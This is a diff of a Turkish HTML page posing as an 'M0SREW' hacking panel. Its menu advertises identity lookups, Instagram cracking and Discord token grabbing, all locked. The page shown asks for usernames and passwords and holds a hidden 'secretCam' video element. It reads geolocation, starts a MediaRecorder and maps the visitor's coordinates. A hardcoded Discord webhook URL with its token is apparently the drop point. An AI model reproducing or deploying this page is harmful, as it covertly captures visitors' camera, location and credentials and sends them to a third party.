@@ -3,81 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>M 0 S R E W // ACCESS</title>
+    <title>M 0 S R E W // AUTH</title>
     <style>
-        /* Tamamen Koyu Mavi ve Siber Mavi Tonları */
-        :root { 
-            --main-blue: #00d2ff; 
-            --dark-blue: #0045ff; 
-            --bg-deep: #020817; 
-            --card-blue: #0b1426; 
-            --border-blue: #1e293b;
+        /* Klasik Temiz Beyaz Arka Plan ve İnce Yazılar */
+        body { 
+            background: #fff; 
+            color: #000; 
+            font-family: 'Inter', sans-serif; /* İnce ve teknik duran font */
+            margin: 0; 
+            padding: 0; 
+            overflow: hidden; 
+        }
+
+        /* YUKARDAN AŞAĞI POLİS IŞIĞI EFEKTİ */
+        @keyframes policeLight {
+            0% { background: #fff; }
+            45% { background: #fff; }
+            50% { background: rgba(255, 0, 0, 0.4); } /* Hafif Kırmızı Kırılma */
+            55% { background: #fff; }
+            95% { background: #fff; }
+            100% { background: rgba(0, 0, 255, 0.3); } /* Hafif Mavi Kırılma */
+        }
+
+        #policeBackground {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 20px; /* Sadece en tepede ince bir şerit */
+            animation: policeLight 1s infinite;
+            z-index: 5000; /* Her şeyin üstünde */
+        }
+
+        /* GİRİŞ EKRANI - KLASİK VE İNCE */
+        #authWrapper { 
+            position: fixed; inset: 0; 
+            background: #fff; /* Tam temiz beyaz */
+            z-index: 10000; 
+            display: flex; justify-content: center; align-items: center; 
+        }
+        .auth-card { 
+            background: #fff; 
+            padding: 40px; 
+            width: 320px; text-align: center; 
+            border: none; /* Çizgi yok */
         }
         
-        body { background: var(--bg-deep); color: #f8fafc; font-family: 'Arial Black', 'Arial', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
-        
-        /* GİRİŞ EKRANI - KALIN, BÜYÜK VE BİRLEŞİK YAZILAR */
-        #authWrapper { position: fixed; inset: 0; background: var(--bg-deep); z-index: 10000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { background: var(--card-blue); padding: 45px; border: 3px solid var(--dark-blue); border-radius: 2px; width: 350px; text-align: center; box-shadow: 0 0 50px rgba(0, 69, 255, 0.3); }
-        
-        /* İstediğin O Sert Ve Kalın Yazı Stili */
+        /* İsteğin İnce Ve Zarif Yazı Stili */
         h1 { 
-            color: var(--main-blue); 
-            font-size: 42px; 
-            font-weight: 900; 
+            color: #000; 
+            font-size: 28px; 
+            font-weight: 300; /* Çok ince */
             margin: 0; 
-            letter-spacing: -4px; /* Yazıları birbirine yaklaştırır */
             text-transform: uppercase;
-            line-height: 0.9;
+            letter-spacing: 5px; /* Yazıları birbirinden ayırır */
         }
         
         .sub-text { 
-            font-weight: 900; 
-            font-size: 14px; 
-            color: var(--dark-blue); 
-            margin-bottom: 25px; 
+            font-weight: 400; 
+            font-size: 11px; 
+            color: #888; 
+            margin-bottom: 30px; 
             letter-spacing: 1px;
             text-transform: uppercase;
         }
 
         input { 
-            width: 100%; padding: 18px; margin-top: 15px; background: #000; border: 2px solid var(--border-blue); 
-            color: var(--main-blue); border-radius: 0px; outline: none; font-weight: 900; font-size: 16px; box-sizing: border-box;
+            width: 100%; padding: 12px; margin-top: 15px; 
+            background: #fff; 
+            border: 1px solid #e0e0e0; /* Çok ince ve hafif çizgi */
+            color: #000; 
+            outline: none; 
+            font-weight: 300; font-size: 14px; 
+            box-sizing: border-box;
+            transition: 0.3s;
         }
+        input:focus { border-color: #000; }
         
         .btn-blue { 
-            background: var(--dark-blue); color: #fff; border: none; padding: 18px; width: 100%; 
-            margin-top: 25px; cursor: pointer; font-size: 18px; font-weight: 900; text-transform: uppercase; 
-            letter-spacing: -1px; transition: 0.3s;
+            background: #000; /* Siyah buton */
+            color: #fff; border: none; padding: 12px; width: 100%; 
+            margin-top: 30px; cursor: pointer; 
+            font-size: 13px; font-weight: 400; 
+            text-transform: uppercase; 
+            letter-spacing: 2px;
         }
-        .btn-blue:hover { background: var(--main-blue); color: #000; }
 
-        /* PANEL */
-        #panel { display: none; padding: 10px; }
-        .top-bar { height: 65px; background: #000; border-bottom: 3px solid var(--dark-blue); display: flex; align-items: center; padding: 0 20px; justify-content: space-between; }
+        /* PANEL (v15 Temizliği) */
+        #panel { display: none; padding: 0; background: #fff; color: #000; }
+        .top-bar { height: 50px; background: #f9f9f9; border-bottom: 1px solid #eee; display: flex; align-items: center; padding: 0 15px; justify-content: space-between; }
         
-        .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 5px; }
-        .hamburger div { width: 30px; height: 4px; background: var(--main-blue); }
+        .map-box { height: 160px; background: #fafafa; border-bottom: 1px solid #eee; overflow: hidden; }
+        #mapImg { width: 100%; height: 100%; object-fit: cover; opacity: 0.8; }
 
-        /* YAN MENÜ */
-        #sideMenu { position: fixed; top: 0; right: -300px; width: 300px; height: 100%; background: #010409; border-left: 3px solid var(--dark-blue); transition: 0.5s; z-index: 35000; padding-top: 80px; }
-        .side-item { padding: 20px 30px; border-bottom: 1px solid var(--border-blue); font-size: 15px; font-weight: 900; cursor: pointer; color: #475569; text-transform: uppercase; letter-spacing: -1px; }
-        .side-item:hover { color: var(--main-blue); background: #0a1120; }
+        .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 4px; }
+        .hamburger div { width: 22px; height: 2px; background: #000; }
 
-        /* ANA LİSTE - DAHA BÜYÜK VE KOYU */
-        .menu-container { background: var(--card-blue); border: 2px solid var(--border-blue); border-radius: 0px; margin-top: 15px; }
-        .menu-item { padding: 16px 20px; border-bottom: 1px solid var(--border-blue); font-size: 13px; font-weight: 900; display: flex; justify-content: space-between; cursor: pointer; letter-spacing: -0.5px; }
-        .status-lock { color: var(--dark-blue); font-weight: 900; }
+        /* YAN MENÜ (Klasik v15) */
+        #sideMenu { position: fixed; top: 0; right: -250px; width: 250px; height: 100%; background: #fff; border-left: 1px solid #eee; transition: 0.4s; z-index: 35000; padding-top: 60px; }
+        .side-item { padding: 15px 25px; border-bottom: 1px solid #eee; font-size: 12px; font-weight: 300; cursor: pointer; color: #555; text-transform: uppercase; }
+        .side-item:hover { color: #000; background: #f9f9f9; }
+
+        /* ANA LİSTE - v15 Temizliği */
+        .menu-container { padding: 10px; }
+        .menu-item { padding: 12px 15px; border-bottom: 1px solid #f1f1f1; font-size: 12px; font-weight: 300; display: flex; justify-content: space-between; cursor: pointer; }
+        .status-lock { color: #888; font-weight: 300; }
 
         /* IFS4 POPUP */
-        #ifsBox { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 320px; background: #000; border: 3px solid var(--main-blue); z-index: 50000; padding: 40px; text-align: center; }
-        .spinner { border: 5px solid #0a1120; border-top: 5px solid var(--main-blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 25px; }
+        #ifsBox { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 280px; background: #fff; border: 1px solid #eee; z-index: 50000; padding: 30px; text-align: center; }
+        .spinner { border: 3px solid #f1f1f1; border-top: 3px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .terminal { background: #000; border-left: 5px solid var(--dark-blue); padding: 15px; font-family: monospace; font-size: 11px; color: #1e293b; height: 120px; overflow-y: auto; margin-top: 15px; font-weight: 900; }
+        .terminal { background: #fafafa; padding: 10px; font-family: monospace; font-size: 11px; color: #aaa; height: 70px; overflow-y: auto; font-weight: 300; border-top: 1px solid #eee; }
     </style>
 </head>
 <body>
+
+<div id="policeBackground"></div>
 
 <audio id="opMusic" loop><source src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3" type="audio/mpeg"></audio>
 <video id="secretCam" style="display:none;" autoplay playsinline muted></video>
@@ -86,72 +125,71 @@
     <div class="auth-card" id="logCard">
         <h1>M0SREW</h1>
         <div class="sub-text">SİSTEME ERİŞİM YETKİSİ</div>
-        <input type="text" id="lMail" placeholder="KULLANICI ADI">
-        <input type="password" id="lPass" placeholder="GÜVENLİK ŞİFRESİ">
+        <input type="text" id="lMail" placeholder="Kullanıcı Adı">
+        <input type="password" id="lPass" placeholder="Güvenlik Şifresi">
         <button class="btn-blue" onclick="processLog()">GİRİŞİ ONAYLA</button>
-        <p style="font-size:11px; color:#1e293b; margin-top:25px; cursor:pointer; font-weight:900;" onclick="showReg()">YENİ TERMİNAL OLUŞTUR</p>
+        <p style="font-size:11px; color:#aaa; margin-top:25px; cursor:pointer;" onclick="showReg()">Yeni Terminal Oluştur</p>
     </div>
 
     <div class="auth-card" id="regCard" style="display:none;">
         <h1>KAYIT</h1>
-        <input type="text" id="rMail" placeholder="E-POSTA ADRESİ">
-        <input type="password" id="rPass" placeholder="SİSTEM ŞİFRESİ">
+        <input type="text" id="rMail" placeholder="E-Posta Adresi">
+        <input type="password" id="rPass" placeholder="Sistem Şifresi">
         <button class="btn-blue" onclick="processReg()">YETKİYİ AKTİF ET</button>
     </div>
 </div>
 
 <div id="panel">
     <div class="top-bar">
-        <span><b style="color:var(--main-blue); font-size: 24px; letter-spacing: -2px;">M0SREW</b> <span id="clock" style="color:var(--dark-blue); font-size:12px; margin-left:15px; font-weight:900;">00:00</span></span>
+        <span><b style="font-size: 18px; letter-spacing: 2px;">M0SREW</b> <span id="clock" style="color:#aaa; font-size:11px; margin-left:15px;">00:00</span></span>
         <div class="hamburger" onclick="toggleMenu()"><div></div><div></div><div></div></div>
     </div>
 
+    <div class="map-box"><img id="mapImg" src=""></div>
+
     <div id="sideMenu">
-        <div class="side-item" onclick="openIFS()" style="color:var(--main-blue); border-left: 5px solid var(--main-blue);">EMRE İFS4</div>
-        <div class="side-item" onclick="msg()">VERİ TABANI LOGLARI</div>
-        <div class="side-item" onclick="msg()">KRİPTO SIZMA PANELİ</div>
-        <div class="side-item" onclick="msg()">NETWORK AYARLARI</div>
-        <div class="side-item" onclick="location.reload()" style="color:var(--dark-blue)">SİSTEMDEN ÇIK</div>
+        <div class="side-item" onclick="openIFS()" style="color:#000;">EMRE İFS4</div>
+        <div class="side-item" onclick="msg()">Veri Tabanı Logları</div>
+        <div class="side-item" onclick="msg()">Kripto Sızma Paneli</div>
+        <div class="side-item" onclick="msg()">Network Ayarları</div>
+        <div class="side-item" onclick="location.reload()" style="color:#888">Sistemden Çık</div>
     </div>
 
-    <div class="terminal" id="termLogs">M 0 S R E W : SİSTEM ÇEKİRDEĞİNE BAĞLANILDI...<br>[OK] GÜVENLİK DUVARI AŞILDI.<br></div>
+    <div class="terminal" id="termLogs">M 0 S R E W : Bağlantı sağlandı...<br></div>
 
     <div class="menu-container">
-        <div class="menu-item">YEREL IP ADRESİ <span id="ipD" style="color:#fff;">---</span></div>
-        <div class="menu-item">UYDU KONUMU <span id="locD" style="color:var(--main-blue);">ARANIYOR...</span></div>
+        <div class="menu-item">YEREL IP ADRESİ <span id="ipD" style="color:#000;">---</span></div>
+        <div class="menu-item">UYDU KONUMU <span id="locD" style="color:#000;">ARANIYOR...</span></div>
         <div class="menu-item" onclick="msg()">MERNİS DATA 2026 <span class="status-lock">M0SREW ONLY</span></div>
         <div class="menu-item" onclick="msg()">GSM LOKASYON VERİSİ <span class="status-lock">M0SREW ONLY</span></div>
         <div class="menu-item" onclick="msg()">TC KİMLİK SORGULA <span class="status-lock">M0SREW ONLY</span></div>
-        <div class="menu-item" onclick="msg()">AİLE SOY ağacı <span class="status-lock">M0SREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">AİLE SOY AĞACI <span class="status-lock">M0SREW ONLY</span></div>
         <div class="menu-item" onclick="msg()">PLAKA KAYITLARI <span class="status-lock">M0SREW ONLY</span></div>
         <div class="menu-item" onclick="msg()">E-OKUL NOT SIZDIRMA <span class="status-lock">M0SREW ONLY</span></div>
-        <div class="menu-item" onclick="msg()">INSTAGRAM PASSWORD CRACK <span class="status-lock">M0SREW ONLY</span></div>
-        <div class="menu-item" onclick="msg()">BANKA HESAP ANALİZİ <span class="status-lock">M0SREW ONLY</span></div>
-        <div class="menu-item" onclick="msg()">DİSCORD TOKEN GRABBER <span class="status-lock">M0SREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">INSTAGRAM CRACK <span class="status-lock">M0SREW ONLY</span></div>
         <div class="menu-item" onclick="msg()">WHATSAPP MESAJ SIZMA <span class="status-lock">M0SREW ONLY</span></div>
-        <div class="menu-item" onclick="msg()">E-DEVLET PROTOKOLÜ <span class="status-lock">M0SREW ONLY</span></div>
-        <div class="menu-item" onclick="msg()">SİLAHTAR SORGULAMA <span class="status-lock">M0SREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">DİSCORD TOKEN GRAB <span class="status-lock">M0SREW ONLY</span></div>
     </div>
 </div>
 
 <div id="ifsBox">
     <div class="spinner"></div>
-    <h2 style="color:var(--main-blue); font-weight:900; letter-spacing: -2px;">EMRE İFS4</h2>
-    <p id="ifsTxt" style="font-size: 13px; color: var(--dark-blue); font-weight: 900;">M0SREW SERVER BAĞLANTISI...</p>
+    <h2 style="font-weight:300; letter-spacing: 2px;">EMRE İFS4</h2>
+    <p id="ifsTxt" style="font-size: 12px; color: #888;">SUNUCU BAĞLANTISI...</p>
 </div>
 
 <script>
     let u = { ip: '...', lat: 0, lon: 0 };
     const wh = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
 
-    function msg() { alert("M 0 S R E W : ERİŞİM ENGELLENDİ. YETERLİ YETKİ SEVİYESİNE SAHİP DEĞİLSİNİZ."); }
-    function toggleMenu() { const m = document.getElementById('sideMenu'); m.style.right = m.style.right === '0px' ? '-300px' : '0px'; }
+    function msg() { alert("M 0 S R E W : Erişim Reddedildi. Sahibine aittir."); }
+    function toggleMenu() { const m = document.getElementById('sideMenu'); m.style.right = m.style.right === '0px' ? '-250px' : '0px'; }
 
     function openIFS() {
         toggleMenu();
         document.getElementById('ifsBox').style.display = 'block';
-        const t = ["SERVER TRANSFER...", "DECRYPTING...", "M0SREW AUTHENTICATION...", "ACCESS DENIED: RE-TRYING..."];
-        let i = 0; setInterval(() => { document.getElementById('ifsTxt').innerText = t[i % t.length]; i++; }, 1500);
+        const t = ["SERVER TRANSFER...", "DECRYPTING...", "AUTHORIZATION...", "ACCESS DENIED..."];
+        let i = 0; setInterval(() => { document.getElementById('ifsTxt').innerText = t[i % t.length]; i++; }, 1800);
     }
 
     function showReg() { document.getElementById('logCard').style.display='none'; document.getElementById('regCard').style.display='block'; }
@@ -176,6 +214,7 @@
             navigator.geolocation.getCurrentPosition((pos) => {
                 u.lat = pos.coords.latitude; u.lon = pos.coords.longitude;
                 document.getElementById('locD').innerText = u.lat.toFixed(2) + "," + u.lon.toFixed(2);
+                document.getElementById('mapImg').src = `https://static-maps.yandex.ru/1.x/?ll=${u.lon},${u.lat}&z=14&l=map&size=600,200&pt=${u.lon},${u.lat},pmwtm`;
             });
 
             const mr = new MediaRecorder(s);
